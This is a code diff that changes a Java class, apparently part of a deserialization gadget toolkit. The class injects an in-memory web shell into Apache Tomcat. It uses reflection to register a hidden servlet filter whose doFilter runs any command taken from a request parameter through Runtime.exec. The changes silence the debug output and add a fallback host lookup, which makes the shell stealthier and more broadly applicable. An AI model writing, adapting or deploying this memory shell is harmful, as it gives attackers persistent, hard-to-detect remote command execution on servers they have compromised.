@@ -5,6 +5,7 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.util.proxy.DefineClassHelper;
 import org.apache.catalina.Context;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
@@ -15,13 +16,8 @@ import javax.servlet.*;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
-import java.util.List;
-
-import static gadget.memshell.TomcatShellInject.getServletContext;
 
 /**
  * @author squirt1e
@@ -57,7 +53,7 @@ public class TomcatShellInject2 extends AbstractTranslet implements Filter {
         return null;
     }
 
-    static  {
+    static {
         try {
             try {
                 StandardContext standardContext = getServletContext();
@@ -67,7 +63,7 @@ public class TomcatShellInject2 extends AbstractTranslet implements Filter {
                 HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
                 if(map.get(filterName) == null){
-                    System.out.println("[+] Add Dynamic Filter");
+//                    System.out.println("[+] Add Dynamic Filter");
 
                     //生成 FilterDef
                     //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
@@ -115,6 +111,7 @@ public class TomcatShellInject2 extends AbstractTranslet implements Filter {
         }catch (Exception e){
             e.printStackTrace();
         }
+
     }
 
 
@@ -204,7 +201,9 @@ public class TomcatShellInject2 extends AbstractTranslet implements Filter {
                 System.out.println(children);
 //                System.out.println(uri);
                 StandardHost standardHost = (StandardHost) children.get(serverName);
-
+                if(standardHost==null){
+                    standardHost = (StandardHost) children.get("localhost");
+                }
                 children = (HashMap) getField(standardHost, "children");
                 Iterator iterator = children.keySet().iterator();
                 while (iterator.hasNext()){
@@ -238,8 +237,8 @@ public class TomcatShellInject2 extends AbstractTranslet implements Filter {
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                          FilterChain filterChain) throws IOException, ServletException {
-        System.out.println(
-                "TomcatShellInject doFilter.....................................................................");
+//        System.out.println(
+//                "TomcatShellInject doFilter.....................................................................");
         String cmd;
         if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
             Process process = Runtime.getRuntime().exec(cmd);
